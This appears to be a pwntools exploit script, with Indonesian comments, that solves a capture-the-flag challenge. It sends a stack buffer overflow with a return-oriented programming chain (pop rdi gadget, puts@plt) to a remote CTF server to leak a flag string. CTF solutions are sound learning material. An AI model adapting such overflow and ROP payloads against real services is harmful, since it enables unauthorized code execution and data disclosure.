from pwn import *
import re

# Binary context (otomatis deteksi arsitektur juga)
context.binary = './redirection'

# Alamat penting
pop_rdi = 0x40131b
puts_plt = 0x401040
flag = 0x4040a0
ret = 0x40101a

p = remote('ctf.asgama.online', 50004)

payload = flat(
    b'A' * 40,
    pop_rdi, flag, puts_plt,
    pop_rdi, flag, puts_plt,
    ret
)

p.sendlineafter("Enter your name:", payload)
output = p.recvall().decode('latin-1', errors='ignore')
print(output)


